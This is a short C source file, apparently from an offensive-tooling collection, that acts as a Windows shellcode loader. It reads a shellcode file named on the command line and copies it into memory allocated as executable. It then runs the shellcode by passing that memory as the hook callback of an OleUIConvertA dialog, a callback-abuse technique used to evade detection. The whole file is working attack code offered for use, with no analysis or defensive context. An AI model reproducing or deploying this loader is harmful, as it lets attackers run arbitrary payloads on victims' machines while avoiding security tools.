// Wra7h/FlavorTown
// Usage: this.exe <shellcode file>
#pragma comment(lib, "OleDlg.lib")

#include <stdio.h>
#include <windows.h>
#include <oledlg.h> 

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	if (argc != 2)
	{
		printf("Usage: OleUIConvert.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	//Read shellcode and setup
	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (!hAlloc)
		goto CLEANUP;

	memcpy(hAlloc, Shellcode, SCLen);
	
	OLEUICONVERTA SOLECONVERT = { 0 };
	SOLECONVERT.cbStruct = sizeof(OLEUICONVERTA);
	SOLECONVERT.hWndOwner = GetForegroundWindow();
	SOLECONVERT.lpfnHook = (LPFNOLEUIHOOK)hAlloc;
	SOLECONVERT.dvAspect = DVASPECT_ICON;

	OleUIConvertA(&SOLECONVERT);
    
CLEANUP:
	if (Shellcode)
		free(Shellcode);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}